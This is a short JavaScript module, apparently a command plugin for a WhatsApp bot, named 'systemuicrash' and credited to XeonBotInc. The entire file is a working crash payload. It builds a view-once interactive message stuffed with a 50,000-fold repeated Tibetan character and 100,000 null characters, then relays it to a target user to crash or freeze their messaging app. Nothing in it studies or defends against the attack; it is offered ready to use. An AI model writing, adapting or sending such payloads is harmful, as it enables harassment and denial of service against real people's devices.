// ============================================================
// BUG: systemuicrash — UI crash via malformed interactive
// Source: XeonBotInc (HansTech) — adapted
// ============================================================

export default {
  id: 'systemuicrash',
  name: 'System UI Crash',

  async execute({ sock, target }) {
    const payload = JSON.stringify({
      display_text: 'ྦྷ'.repeat(50000),
      url: 'https://www.google.com',
      merchant_url: 'https://www.google.com',
    });

    const msg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            body: { text: '' },
            footer: { text: '' },
            nativeFlowMessage: {
              buttons: [
                {
                  name: 'cta_url',
                  buttonParamsJson: payload,
                },
              ],
              messageParamsJson: '\u0000'.repeat(100000),
            },
          },
        },
      },
    };

    await sock.relayMessage(target, msg, {});
  },
};